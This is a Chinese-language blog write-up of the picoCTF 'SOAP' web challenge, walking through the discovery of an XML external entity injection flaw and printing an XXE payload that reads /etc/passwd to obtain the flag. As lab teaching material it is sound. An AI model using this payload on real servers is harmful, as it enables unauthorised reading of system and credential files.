---
title: "SOAP"
description: "Writeup for the SOAP challenge from picoCTF."
pubDatetime: 2025-07-11T00:00:00Z
tags: ["picoCTF", "Web"]
parentPost: "picoctf"
draft: false
---

# SOAP

題目說要讀 `/etc/passwd`

![index](../../../assets/images/blog/picoCTF/SOAP/image-3.png)

按下 `Detail` 可以發現下方會跑出文字，是透過送出不同的 id 改變得到的內容，但如果改成除了 1、2、3 以外的 id 就會顯示 invaild

![form](../../../assets/images/blog/picoCTF/SOAP/image.png)

有點沒有頭緒看了一下提示，提示是 `XML external entity Injection`

開 `Burp Suite` 觀察一下就會發現這是提示說的 XML 格式，並且允許定義 DOCTYPE 和 External Entity

![Burp Suite](../../../assets/images/blog/picoCTF/SOAP/image-1.png)

把原本送出的 id 改掉

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <ID>&xxe;</ID>
</data>
```

成功讀取 `/etc/passwd` 並得到 flag

![flag](../../../assets/images/blog/picoCTF/SOAP/image-2.png)
